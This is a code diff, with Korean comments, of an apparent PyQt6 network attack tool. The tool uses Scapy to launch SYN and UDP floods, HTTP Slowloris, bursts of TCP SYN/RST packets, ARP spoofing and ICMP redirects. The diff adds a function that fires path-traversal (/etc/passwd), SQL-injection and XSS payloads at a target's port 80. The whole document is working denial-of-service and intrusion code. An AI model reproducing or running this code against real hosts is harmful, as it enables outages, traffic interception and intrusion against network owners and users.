@@ -2,7 +2,7 @@
 from PyQt6.QtWidgets import QWidget, QVBoxLayout, QLabel, QPushButton, QLineEdit, QHBoxLayout, QCheckBox, QMessageBox, QComboBox, QProgressBar, QTextEdit
 from PyQt6.QtGui import QIcon
 from PyQt6.QtCore import Qt, QTimer, QThread, pyqtSignal
-from scapy.all import IP, TCP, UDP, send, sr1, ICMP, Ether, ARP, conf, Raw
+from scapy.all import IP, TCP, UDP, send, sr1, srp, ICMP, Ether, ARP, conf, Raw
 import threading
 import socket
 import random
@@ -103,7 +103,7 @@ def syn_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None, pr
     sent_count = 0
     
     for i in range(packet_count):
-        if stop_flag.is_set():
+        if stop_flag and stop_flag.is_set():
             break
         
         sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
@@ -195,7 +195,7 @@ def udp_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None, pr
     sent_count = 0
     
     for i in range(packet_count):
-        if stop_flag.is_set():
+        if stop_flag and stop_flag.is_set():
             break
         
         sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
@@ -240,6 +240,7 @@ def udp_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None, pr
 
 # HTTP Slowloris 공격을 수행하는 함수
 def http_slowloris(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
+    """HTTP Slowloris 공격 (느린 HTTP 요청으로 서버 리소스 고갈)"""
     # 개선된 모듈이 사용 가능한 경우 새 함수 사용
     if USE_IMPROVED_MODULES:
         try:
@@ -248,7 +249,6 @@ def http_slowloris(target_ip, packet_count, packet_size, stop_flag, spoof_ip=Non
             print(f"⚠️ 개선된 HTTP Slowloris 함수 실행 실패, 기존 함수로 폴백: {e}")
     
     # 기존 함수 로직 (폴백)
-    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
     iface, src_ip = get_default_iface_and_ip()
     if not iface:
         print(f"네트워크 인터페이스를 찾을 수 없습니다.")
@@ -261,44 +261,48 @@ def http_slowloris(target_ip, packet_count, packet_size, stop_flag, spoof_ip=Non
 
     print(f"HTTP Slowloris 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 패킷 수: {packet_count}")
     
-    # HTTP 요청 헤더 생성
-    http_headers_template = [
-        "GET / HTTP/1.1",
-        f"Host: {target_ip}",
-        "User-Agent: Mozilla/5.0",
-        "Accept: text/html",
-        "Connection: keep-alive"
-    ]
-    
-    # 패킷을 리스트에 모아서 한 번에 전송
+    sent_count = 0
     packets = []
+    
     for i in range(packet_count):
-        if stop_flag.is_set():
+        if stop_flag and stop_flag.is_set():
             break
         
-        sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
-        
-        # 부분적인 HTTP 요청 생성 (완료되지 않는 요청)
-        headers = http_headers_template.copy()
-        # 패킷마다 다른 헤더 추가 (완료되지 않게)
-        headers.append(f"X-Header-{i}: {'X' * min(50, i % 100)}")
-        http_payload = "\r\n".join(headers)
-        
-        # 패킷 생성
-        packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=80, flags='PA')/Raw(load=http_payload)
-        packets.append(packet)
-        
-        # 일정 개수마다 전송 (메모리 부담 감소)
-        if len(packets) >= min(MAX_PACKET_CACHE_SIZE, 500) or i == packet_count-1:
-            try:
+        try:
+            sport = random.randint(1024, 65535)
+            
+            # 부분적인 HTTP 요청 생성 (완료되지 않는 요청)
+            headers = [
+                "GET / HTTP/1.1",
+                f"Host: {target_ip}",
+                "User-Agent: Mozilla/5.0",
+                "Accept: text/html",
+                "Connection: keep-alive",
+                f"X-Header-{i}: {'X' * min(50, i % 100)}"
+            ]
+            http_payload = "\r\n".join(headers).encode()
+            
+            # TCP 패킷 생성 (PSH+ACK 플래그)
+            packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=80, flags='PA')/Raw(load=http_payload)
+            packets.append(packet)
+            
+            # 배치 전송 (메모리 효율)
+            if len(packets) >= PACKET_BATCH_SIZE or i == packet_count-1:
                 send(packets, iface=iface, verbose=0, inter=0, realtime=False)
-                subprocess.run(f'echo {len(packets)}개 HTTP Slowloris 패킷 전송 ({i+1}/{packet_count})', shell=True)
-                packets.clear()  # 메모리 재사용
-            except Exception as e:
-                subprocess.run(f'echo 패킷 전송 중 오류: {str(e)}', shell=True)
-                packets.clear()  # 오류 발생해도 메모리 정리
+                sent_count += len(packets)
+                
+                if sent_count % 100 == 0:
+                    print(f"HTTP Slowloris 패킷 전송: {sent_count}/{packet_count}")
+                
+                packets.clear()
+                gc.collect()
+                
+        except Exception as e:
+            print(f'HTTP Slowloris 패킷 전송 오류: {str(e)}')
+            packets.clear()
+            continue
     
-    # 메모리 정리
+    print(f"✅ HTTP Slowloris 완료: {sent_count}개 패킷 전송")
     del packets
     gc.collect()
 
@@ -325,78 +329,138 @@ def tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag, spoof_
 
     print(f"TCP 핸드셰이크 오용 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 패킷 수: {packet_count}")
     
-    # 패킷을 리스트에 모아서 한 번에 전송
+    sent_count = 0
     syn_packets = []
     rst_packets = []
     
     for i in range(packet_count):
-        if stop_flag.is_set():
+        if stop_flag and stop_flag.is_set():
             break
         
-        sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
-        dport = random.randint(1, 65535)     # 목적지 포트도 랜덤
-        payload_size = max(0, packet_size - 20 - 20 - 14)  # IP(20) + TCP(20) + Ethernet(14)
-        
-        # SYN 패킷 생성
-        syn_packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=dport, flags='S')/Raw(load='X'*payload_size)
-        syn_packets.append(syn_packet)
-        
-        # RST 패킷 생성 (핸드셰이크 중단)
-        rst_packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=dport, flags='R')
-        rst_packets.append(rst_packet)
-        
-        # 일정 개수마다 전송 (메모리 부담 감소)
-        if len(syn_packets) >= min(MAX_PACKET_CACHE_SIZE, 500) or i == packet_count-1:
-            try:
+        try:
+            sport = random.randint(1024, 65535)
+            dport = random.choice([80, 443, 22, 21, 25])  # 주요 서비스 포트
+            seq_num = random.randint(0, 4294967295)
+            
+            # SYN 패킷 생성
+            syn_packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=dport, flags='S', seq=seq_num)
+            syn_packets.append(syn_packet)
+            
+            # RST 패킷 생성 (핸드셰이크 중단)
+            rst_packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=dport, flags='R', seq=seq_num+1)
+            rst_packets.append(rst_packet)
+            
+            # 배치 전송 (메모리 효율)
+            if len(syn_packets) >= PACKET_BATCH_SIZE or i == packet_count-1:
                 # SYN 패킷 전송
                 send(syn_packets, iface=iface, verbose=0, inter=0, realtime=False)
-                subprocess.run(f'echo {len(syn_packets)}개 TCP SYN 패킷 전송 ({i+1}/{packet_count})', shell=True)
+                sent_count += len(syn_packets)
                 
-                # 약간의 지연 후 RST 패킷 전송
+                # 짧은 지연 후 RST 패킷 전송
                 time.sleep(0.01)
                 send(rst_packets, iface=iface, verbose=0, inter=0, realtime=False)
-                subprocess.run(f'echo {len(rst_packets)}개 TCP RST 패킷 전송 ({i+1}/{packet_count})', shell=True)
                 
-                # 패킷 리스트 초기화
+                if sent_count % 100 == 0:
+                    print(f"TCP 핸드셰이크 오용 패킷 전송: {sent_count}/{packet_count}")
+                
                 syn_packets.clear()
                 rst_packets.clear()
-            except Exception as e:
-                subprocess.run(f'echo 패킷 전송 중 오류: {str(e)}', shell=True)
-                syn_packets.clear()
-                rst_packets.clear()
+                gc.collect()
+                
+        except Exception as e:
+            print(f'TCP 핸드셰이크 오용 패킷 전송 오류: {str(e)}')
+            syn_packets.clear()
+            rst_packets.clear()
+            continue
     
-    # 메모리 정리
+    print(f"✅ TCP 핸드셰이크 오용 완료: {sent_count}개 패킷 전송")
     del syn_packets
     del rst_packets
     gc.collect()
 
 # SSL/TLS 트래픽을 생성하는 함수.
 def ssl_traffic(target_ip, count, packet_size, stop_flag):
-    import ssl
-    import socket
-    for _ in range(count):
-        if stop_flag.is_set():
+    """SSL/TLS 트래픽 생성 (실제 SSL 연결 대신 Scapy로 시뮬레이션)"""
+    iface, src_ip = get_default_iface_and_ip()
+    if not iface:
+        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
+        return
+    
+    print(f"SSL/TLS 트래픽 시작 - 인터페이스: {iface}, 대상: {target_ip}:443")
+    
+    sent_count = 0
+    for i in range(count):
+        if stop_flag and stop_flag.is_set():
             break
-        context = ssl.create_default_context()
-        with socket.create_connection((target_ip, 443)) as sock:
-            with context.wrap_socket(sock, server_hostname=target_ip) as ssock:
-                data_size = packet_size - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
-                data = b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n' + b'X' * data_size + b'\r\n\r\n'
-                ssock.sendall(data)
-                subprocess.run(f'echo SSL/TLS packet sent to {target_ip}:443', shell=True)
+        
+        try:
+            # SSL/TLS 핸드셰이크 시뮬레이션 (ClientHello)
+            # 실제 SSL 연결 대신 TCP 패킷으로 시뮬레이션
+            sport = random.randint(1024, 65535)
+            
+            # TCP SYN (SSL 연결 시작)
+            syn_packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=443, flags='S', seq=random.randint(0, 4294967295))
+            
+            # 패킷 전송
+            send(syn_packet, iface=iface, verbose=0)
+            sent_count += 1
+            
+            if sent_count % 10 == 0:
+                print(f"SSL/TLS 패킷 전송: {sent_count}/{count}")
+            
+            time.sleep(0.01)  # 전송 간격
+            
+        except Exception as e:
+            print(f"SSL/TLS 패킷 전송 오류: {str(e)}")
+            continue
+    
+    print(f"✅ SSL/TLS 트래픽 완료: {sent_count}개 패킷 전송")
 
 # HTTP 요청을 변조하는 함수.
 def http_request_modification(target_ip, packet_count, packet_size, stop_flag):
-    import requests
-    for _ in range(packet_count):
-        if stop_flag.is_set():
+    """HTTP 요청 변조 공격 (Scapy로 악성 HTTP 패킷 생성)"""
+    iface, src_ip = get_default_iface_and_ip()
+    if not iface:
+        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
+        return
+    
+    print(f"HTTP 요청 변조 시작 - 인터페이스: {iface}, 대상: {target_ip}:80")
+    
+    sent_count = 0
+    for i in range(packet_count):
+        if stop_flag and stop_flag.is_set():
             break
-        headers = {'User-Agent': 'ModifiedUserAgent'}
+        
         try:
-            requests.get(f'http://{target_ip}', headers=headers)
-            subprocess.run(f'echo HTTP request sent to {target_ip}', shell=True)
-        except requests.exceptions.RequestException:
-            pass
+            sport = random.randint(1024, 65535)
+            
+            # 악성 HTTP 요청 페이로드 생성
+            malicious_payloads = [
+                b'GET /../../../etc/passwd HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n',  # Path traversal
+                b'GET /?id=1\' OR \'1\'=\'1 HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n',  # SQL injection
+                b'GET /<script>alert(1)</script> HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n',  # XSS
+                b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\nUser-Agent: <script>alert(1)</script>\r\n\r\n',  # Header injection
+            ]
+            
+            payload = random.choice(malicious_payloads)
+            
+            # TCP 패킷 생성 (HTTP 포트 80)
+            packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=80, flags='PA')/Raw(load=payload)
+            
+            # 패킷 전송
+            send(packet, iface=iface, verbose=0)
+            sent_count += 1
+            
+            if sent_count % 10 == 0:
+                print(f"HTTP 변조 패킷 전송: {sent_count}/{packet_count}")
+            
+            time.sleep(0.05)  # 전송 간격
+            
+        except Exception as e:
+            print(f"HTTP 변조 패킷 전송 오류: {str(e)}")
+            continue
+    
+    print(f"✅ HTTP 요청 변조 완료: {sent_count}개 패킷 전송")
 
 # ARP 스푸핑 공격을 수행하는 함수.
 def arp_spoof(target_ip, spoof_ip, stop_flag):
@@ -439,7 +503,7 @@ def arp_spoof(target_ip, spoof_ip, stop_flag):
     iteration = 0
     
     # 제한된 스푸핑 시작
-    while not stop_flag.is_set() and iteration < max_iterations:
+    while not (stop_flag and stop_flag.is_set()) and iteration < max_iterations:
         try:
             # 미리 생성한 패킷들을 빠르게 전송
             send(arp_packets, iface=iface, verbose=0, inter=0)
@@ -454,8 +518,11 @@ def arp_spoof(target_ip, spoof_ip, stop_flag):
         except Exception as e:
             print(f'ARP 패킷 전송 중 오류: {str(e)}')
             time.sleep(1.0)  # 오류 발생 시 좀 더 긴 지연
+            continue
     
-    print(f"ARP 스푸핑 완료 - 총 {count}개 패킷 전송")
+    print(f"✅ ARP 스푸핑 완료 - 총 {count}개 패킷 전송")
+    del arp_packets
+    gc.collect()
 
 # ICMP 리다이렉트 공격을 수행하는 함수.
 def icmp_redirect(target_ip, new_gateway_ip, stop_flag):
@@ -471,11 +538,12 @@ def icmp_redirect(target_ip, new_gateway_ip, stop_flag):
     # 원래 게이트웨이 IP 확인 (실제 게이트웨이 주소를 사용하도록)
     gateway_ip = get_default_gateway() or "192.168.1.1"
     
-    count = 0
+    sent_count = 0
     max_iterations = 100  # 최대 반복 횟수 제한
+    iteration = 0
     
-    while not stop_flag.is_set() and count < max_iterations:
-        count += 1
+    while not (stop_flag and stop_flag.is_set()) and iteration < max_iterations:
+        iteration += 1
         try:
             # Scapy를 사용하여 ICMP 리다이렉트 패킷 생성
             redirect_packet = IP(src=gateway_ip, dst=target_ip)/ICMP(
@@ -485,18 +553,21 @@ def icmp_redirect(target_ip, new_gateway_ip, stop_flag):
             
             # 패킷 전송
             send(redirect_packet, iface=iface, verbose=0)
+            sent_count += 1
+            
             # 로그 출력 빈도 감소 (매 10번째 패킷마다)
-            if count % 10 == 0:
-                print(f'ICMP redirect packet #{count} sent to {target_ip} (new gateway: {new_gateway_ip})')
+            if sent_count % 10 == 0:
+                print(f'ICMP 리다이렉트 패킷 전송: {sent_count}/{max_iterations}')
             
             # 리다이렉트도 주기적으로 반복
             time.sleep(1.0)
             
         except Exception as e:
-            print(f'Error sending ICMP redirect packet: {str(e)}')
-            time.sleep(1.0)  # 오류 발생 시 더 긴 지연
+            print(f'ICMP 리다이렉트 패킷 전송 오류: {str(e)}')
+            time.sleep(1.0)
+            continue
     
-    print(f"ICMP 리다이렉트 완료 - 총 {count}개 패킷 전송")
+    print(f"✅ ICMP 리다이렉트 완료 - 총 {sent_count}개 패킷 전송")
 
 # 네트워크 인터페이스와 IP 가져오는 유틸리티 함수
 def get_default_iface_and_ip():
